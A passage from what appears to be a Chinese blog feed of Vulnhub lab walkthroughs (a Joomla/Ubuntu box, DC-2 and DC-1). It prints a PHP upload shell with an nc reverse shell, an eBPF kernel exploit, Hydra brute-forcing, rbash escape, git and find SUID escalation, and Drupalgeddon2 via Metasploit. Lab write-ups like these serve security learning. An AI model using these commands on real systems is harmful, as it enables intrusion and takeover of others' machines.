0,1),0x3a),1)</p><ul><li><p>登录</p><p>破解hash值录<code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code><br>爆破得到密码： snoopy</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720204736.png" alt></p></li><li><p>寻找上传点</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720205802.png" alt></p></li><li><p>反弹shell</p><p>写入代码</p><p><code>&lt;?php system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 1337 &gt;/tmp/f’); ?&gt;</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720210056.png" alt></p></li><li><p>kali 监听 获取shell</p><p>这里切记一定要在同一个网段下，虽然两个网段也能通信但是shell反弹失败</p><p>获取交互模式</p><p><code>python &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>注意： 如果交互模式不成功，就换个文件名或者换个路径重新反弹交互shell</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213055.png" alt></p></li></ul><ul><li><p>获取信息</p><p>获取版本信息</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213332.png" alt></p></li><li><p>搜索相关系统漏洞尝试提权</p><p>参考： <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p><p>然后我参照大佬的选用了本地拒绝服务漏洞提权</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720214214.png" alt></p><p>如果要复现漏洞需要检查版本，用户权限</p><p>将提权下载到本地，编译后，使用wget下载，这个下载了好久才下载好</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235102.png" alt></p></li></ul><p>  之后就是按步骤走了</p><p>  下载两个文件<br>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar xf exploit.tar  </span><br><span class="line">cd ebpf_mapfd_doubleput_exploit  </span><br><span class="line">./compile.sh  </span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure></p><p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235919.png" alt></p><ul><li><p>提权成功</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000019.png" alt></p></li><li><p>获取flag</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000242.png" alt></p></li></ul><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>​    这次花费了大量的时间调试，对于各种问题的解决方式有待提高，今日份的靶机奉上，本靶机只适合学习不要将其中的技术用于其他途径。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见cms漏洞 和系统版本提权&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="joomla cms 注入" scheme="http://yoursite.com/tags/joomla-cms-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ubuntu 16.04 bpf 提权" scheme="http://yoursite.com/tags/ubuntu-16-04-bpf-%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub DC-2</title>
    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-2/"/>
    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-2/</id>
    <published>2019-10-04T02:59:38.000Z</published>
    <updated>2019-10-04T02:59:59.237Z</updated>
    
    <content type="html"><![CDATA[<p>掌握工具和提权方式</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于Vulnhub  以及DC，以及如何使用ova安装，我已经在DC-1中介绍了 ，今天带来第二弹，比第一弹难度稍微大一点，重点还是考察工具的使用和命令的熟练程度<br>附上链接<a href="https://blog.csdn.net/wang_624/article/details/90509951" target="_blank" rel="noopener">Vulnhub DC Challenges之 DC-1</a></p><h2 id="DC-2介绍"><a href="#DC-2介绍" class="headerlink" title="DC-2介绍"></a>DC-2介绍</h2><p>DC-2，我们主要是从web入手渗透拿到flag，需要大家对信息收集要有一定的了解，需要掌握的工具:nmap,hydra,cewl。</p><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>DC-2:192.168.248.154<br>ubuntu:192.168.248.149</p><h2 id="前期配置"><a href="#前期配置" class="headerlink" title="前期配置"></a>前期配置</h2><p>这里作者提示我们需要设置hosts才能访问web服务。<br>提供linux和windows设置方式<br>Linux<br>    <code>vim  /etc/hosts</code><br>添加 <code>靶机ip DC-2</code><br><img src="https://img-blog.csdnimg.cn/20190526004434224.png" alt="在这里插入图片描述">Windows<br><code>C:\Windows\System32\drivers\etc\hosts</code><br>添加  <code>靶机ip DC-2</code><br><img src="https://img-blog.csdnimg.cn/20190526004644262.png" alt="在这里插入图片描述"></p><h2 id="开始拿flag"><a href="#开始拿flag" class="headerlink" title="开始拿flag"></a>开始拿flag</h2><p>扫描网段<br><img src="https://img-blog.csdnimg.cn/20190526004741929.png" alt="在这里插入图片描述"><br>扫描端口<br>这里我只扫描了常用的端口，只有80端口啊，看来这是一次web提权之路。<br><img src="https://img-blog.csdnimg.cn/20190526004847309.png" alt="在这里插入图片描述">如果之前没有设置hosts ，这里访问就会失败。设置之后，接下来就可以正常去访问DC-2的web服务了。查看下网站的指纹信息，</p><p><img src="https://img-blog.csdnimg.cn/20190526005047396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">尝试直接去msf利用WordPress 去提权，发现需要admin的密码，作废</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>查看页面信息，发现了flag1<br><img src="https://img-blog.csdnimg.cn/20190526005155922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">tip：登录去找到下一个flag，可能需要账号和密码，这里提示你使用cewl工具，密码藏在页面里<br>先去看看页面都有什么，看看有没有登录的地方，尝试去试探login.php,admin.php,等等类似后台或者登录的页面，发现都会导向一个搜索页面<br><img src="https://img-blog.csdnimg.cn/20190526005358967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">随便搜索点东西，发现flag1<br><img src="https://img-blog.csdnimg.cn/20190526005422453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">额，发现flag1 ，什么鬼，发现右下边的都可以点，试着点点看看有什么东西没，发现登录点，这是大收获啊。发现后台<br><img src="https://img-blog.csdnimg.cn/20190526005500558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>返回刚才的搜索页面继续去收集信息，flag2 也出来了，又是提示啊，看来这里有两个方法啊，<br><img src="https://img-blog.csdnimg.cn/20190526005530928.png" alt="在这里插入图片描述">接下来我们尝试利用cewl 生成密码字典<br><img src="https://img-blog.csdnimg.cn/20190526005618577.png" alt="在这里插入图片描述">然后有了密码， 没有用户名，找到了一款针对于wordpress的安全扫描软件</p><p>简要介绍一下，<br>WPScan是一款针对wwordpress的安全扫描软件；WPScan可以扫描出wordpress的版本，主题，插件，后台用户以及爆破后台用户密码等（但是我的kali的工具一直要更新，如果大家有这个工具可以尝试一下）</p><p>那么尝试利用burp去爆破通过对返回长度不同判断是否有当前用户，这里通过我强大的字典，跑出来了三个用户名:admin,jerry和tom<br><img src="https://img-blog.csdnimg.cn/20190526005842814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后使用hydra去爆破wordpress后台，然后分别设置用户字典和密码字典，我们去爆破<br>提供两个爆破思路<br>使用hydra</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt  -P dc2.txt dc-2 http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190526010020733.png" alt="在这里插入图片描述">使用burp去爆破，截取数据包，然后<code>Ctrl+l</code>之后根据下图修改<br><img src="https://img-blog.csdnimg.cn/20190526010102130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">选择你的payload，分别导入用户字典和密码字典，<br>我的burp是专业版，可以跑多线程，设置多线程之后，可以很快的跑出来，线程加高，几秒跑出来了<br><img src="https://img-blog.csdnimg.cn/20190526010312990.png" alt="在这里插入图片描述">登录后台<br>|  username|  password |<br>|:——–:|——-  |<br>|  tom | parturient|<br>| jerry |adipiscing  |<br>这两个密码登录成功<br><img src="https://img-blog.csdnimg.cn/20190526010608665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">既然拿到了密码， 我们尝试去使用密码去尝试去反弹shell，创建失败，需要更高的权限</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>这里就不知道怎么去弄了，重新查看之前收集的数据，扫描全端口，发现了新的端口<br>nmap -p- -sV 192.168.248.154<br>发现了ssh端口，尝试我们得到的用户去登录<br><img src="https://img-blog.csdnimg.cn/20190526010638857.png" alt="在这里插入图片描述">使用tom用户直接登录成功<br><img src="https://img-blog.csdnimg.cn/20190526010700380.png" alt="在这里插入图片描述">发现-rbash 命令没有找到<br><img src="https://img-blog.csdnimg.cn/20190526010714658.png" alt="在这里插入图片描述"><br>查找绕过方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">$ /bin/bash</span><br><span class="line">bash: groups: command not found</span><br><span class="line">tom@DC-2:~$  export PATH=$PATH:/bin/</span><br><span class="line">tom@DC-2:~$  export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a><br><img src="https://img-blog.csdnimg.cn/20190526010834281.png" alt="在这里插入图片描述"><br>查看flag3<br><img src="https://img-blog.csdnimg.cn/20190526010851201.png" alt="在这里插入图片描述"></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>查看passwd，发现jerry用户<br><img src="https://img-blog.csdnimg.cn/2019052601090790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">尝试切换到jerry （这里我尝试直接登录jerry 显示权限被拒绝）<br>切换登录成功</p><p>查看目录发现flag4</p><p><img src="https://img-blog.csdnimg.cn/20190526010949944.png" alt="在这里插入图片描述"></p><h2 id="最终flag"><a href="#最终flag" class="headerlink" title="最终flag"></a>最终flag</h2><p>sudo 查看 发现可以使用git命令，并且是可以是root权限不需要密码<br><img src="https://img-blog.csdnimg.cn/20190526011019444.png" alt="在这里插入图片描述">继续百度，搜索git提权<br>命令：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git -p help</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p>参考链接<br><a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/git/#limited-suid</a></p><p><img src="https://img-blog.csdnimg.cn/20190526011129561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看/root<br>拿到最后的flag<br><img src="https://img-blog.csdnimg.cn/20190526011142208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>前台爆破，需要社工到用户名和密码</li><li>-rbash 绕过</li><li>git 提权</li></ol><hr><p>永远不要停下学习的脚步</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;掌握工具和提权方式&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="git提权" scheme="http://yoursite.com/tags/git%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub之DC-1 find 提权骚思路</title>
    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-1/"/>
    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-1/</id>
    <published>2019-10-04T02:58:07.000Z</published>
    <updated>2019-10-04T02:58:48.205Z</updated>
    
    <content type="html"><![CDATA[<p>DC-1 学习</p><a id="more"></a><h1 id="Vulnhub简介"><a href="#Vulnhub简介" class="headerlink" title="Vulnhub简介"></a>Vulnhub简介</h1><p>Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，大多是Boot2root，从启动虚机到获取操作系统的root权限和查看flag。<br>网址：<a href="https://www.vulnhub.com" target="_blank" rel="noopener">https://www.vulnhub.com</a></p><h2 id="DC-系列"><a href="#DC-系列" class="headerlink" title="DC 系列"></a>DC 系列</h2><p>DC总共有6个靶机，本次我们使用的靶机是DC-1 ，难度不大，适合新手去实验和入门，<br>下载地址:  <a href="http://www.five86.com/dc-1.html" target="_blank" rel="noopener">http://www.five86.com/dc-1.html</a></p><h2 id="DC-1-介绍"><a href="#DC-1-介绍" class="headerlink" title="DC-1 介绍"></a>DC-1 介绍</h2><p>DC-1 没有烧脑的难度，重点是需要我们去掌握一些常用的渗透工具，比如nmap，hydra，msf等等。<br>作者说flag在root目录下，那么我们最终的任务就是去提权或者获取到有root权限去执行命令。<br>初次接触可能需要去百度相关的知识，所以努力的你肯定会有所进步，</p><h1 id="简要说明一下安装"><a href="#简要说明一下安装" class="headerlink" title="简要说明一下安装"></a>简要说明一下安装</h1><ol><li>下载好之后解压，然后使用vmware打开ova文件。<br><img src="https://img-blog.csdnimg.cn/20190523224514645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2. 之后可能会提示报错，不用管忽略。由于是桥接网络，所以我们需要设置一下，我选择的是NAT<br><img src="https://img-blog.csdnimg.cn/20190523224758585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">准备就绪，可以开始了！！</li></ol><h1 id="开始拿flag喽，激动不"><a href="#开始拿flag喽，激动不" class="headerlink" title="开始拿flag喽，激动不"></a>开始拿flag喽，激动不</h1><h2 id="介绍下环境"><a href="#介绍下环境" class="headerlink" title="介绍下环境"></a>介绍下环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网段：192.168.248.0/24</span><br><span class="line">主机：192.168.248.149</span><br><span class="line">靶机：192.168.248.152</span><br></pre></td></tr></table></figure><p>这里大家需要注意一下，因为我是用的ubuntu，所以有的命令需要加sudo，如果大家用的是kali就不需要了</p><h2 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h2><p>命令：<code>nmap -sn 192.168.248.0/24</code></p><p><img src="https://img-blog.csdnimg.cn/20190523225316403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h2><p>命令：<code>nmap -sS 192.168.248.152</code></p><p>-sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限<br><img src="https://img-blog.csdnimg.cn/20190523225645455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="收集信息，查看目标主页"><a href="#收集信息，查看目标主页" class="headerlink" title="收集信息，查看目标主页"></a>收集信息，查看目标主页</h2><p>我这里尝试了弱密码，好像没啥用，看到了网站的管理系统，尝试查找相关漏洞攻击<br><img src="https://img-blog.csdnimg.cn/20190523225754230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="使用Metasploit查找漏洞获取shell"><a href="#使用Metasploit查找漏洞获取shell" class="headerlink" title="使用Metasploit查找漏洞获取shell"></a>使用Metasploit查找漏洞获取shell</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ msfconsole -q</span><br><span class="line">msf5 &gt; search drupal</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523225943748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">选择最新最有效的的去尝试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p>查看选项，设置相关参数<br><img src="https://img-blog.csdnimg.cn/20190523231122428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">设置rhosts</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.248.152</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure><p>成功获取shell<br><img src="https://img-blog.csdnimg.cn/20190523232130797.png" alt="在这里插入图片描述">获取交互式shell<br><img src="https://img-blog.csdnimg.cn/20190523232203708.png" alt="在这里插入图片描述"></p><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ ls</span><br><span class="line">发现flag1 文件</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523232358393.png" alt="在这里插入图片描述">搜索flag文件，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -name  flag</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523232823474.png" alt="在这里插入图片描述">查看passwd文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523232626814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现特别的用户，尝试去查看用户的目录<br>找到了一个flag4.txt,这里是作者迷惑你的一个flag，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cd /home</span><br><span class="line">www-data@DC-1:/home$ ls</span><br><span class="line">flag4</span><br><span class="line">www-data@DC-1:/home$ cd /www-data@DC-1:/home/flag4$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">www-data@DC-1:/home/flag4$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it's not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>既然我们在普通用户下没有找到flag，我们只能去提权了</p><p>查看shadow文件,发现权限不足</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523233645786.png" alt="在这里插入图片描述"><br>查找系统中具有suid设置的所有文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523234336213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里去查看了下大佬的骚思路，找到了find提权方式,成功拿到shell<br>说明提权方式,为什么我们会想到用find提权，作者在flag3也告诉了我们，所以如果大家要一步一步的走，请移步后面flag到flag3查找过程<br>利用find的权限，使用exec去执行一些root权限的命令。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ touch wxy</span><br><span class="line">www-data@DC-1:/var/www$ find / -name wxy -exec "whoami" \;</span><br><span class="line">www-data@DC-1:/var/www$ find / -name -exec "/bin/sh" \;</span><br><span class="line"># ls</span><br><span class="line"># cd /root</span><br><span class="line"># ls</span><br><span class="line"># cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you've enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190523234628328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 提权成功，但是我们怎么能满足于只拿到flag，接下来，就是寻找flag之旅</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>这个比较好找，我直接ls了当前的目录就发现了<br><img src="https://img-blog.csdnimg.cn/20190523235318529.png" alt="在这里插入图片描述">查看flag1.txt</p><p><img src="https://img-blog.csdnimg.cn/20190523235359943.png" alt="在这里插入图片描述"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>那么我们就去查看cms配置文件,顺便收获flag2<br>发现sites文件，逐步进入查看发现settings.php</p><p><img src="https://img-blog.csdnimg.cn/20190523235801197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看settings.php,获取到了flag2 和数据库密码<br><img src="https://img-blog.csdnimg.cn/20190523235920686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">登录数据库</p><p><img src="https://img-blog.csdnimg.cn/20190524000305209.png" alt="在这里插入图片描述">查看当前数据库<br><img src="https://img-blog.csdnimg.cn/20190524000353118.png" alt="在这里插入图片描述"><br>查看表drupaldb<br><code>show tables from drupaldb;</code><br><img src="https://img-blog.csdnimg.cn/20190524000703263.png" alt="在这里插入图片描述"><br>查看users表中的信息，发现两个用户<br><img src="https://img-blog.csdnimg.cn/20190524001240308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">搜索drupal的加密方式，尝试破解或者置换密码<br>参考链接：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin   </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin hash: $S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV</span><br></pre></td></tr></table></figure><p>复制 加密的密码，去数据库修改</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update users set pass ="$S$DVoemoxFFm9/7b0MuI7NDlBLlzty2pkOYF8Noj/IkodVTd9u84qV" where name="admin";</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>去网站登录<br><img src="https://img-blog.csdnimg.cn/20190524002525352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现flag3<br><img src="https://img-blog.csdnimg.cn/20190524002558428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根据这个提示，在结合上面find具有suid的权限，我们去搜索提权可以获取到使用find提权去执行root权限，最后拿到最终flag。</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>这个在flag4用户目录下,我们切换到flag4目录下<code>cd /home/flag4</code><br><img 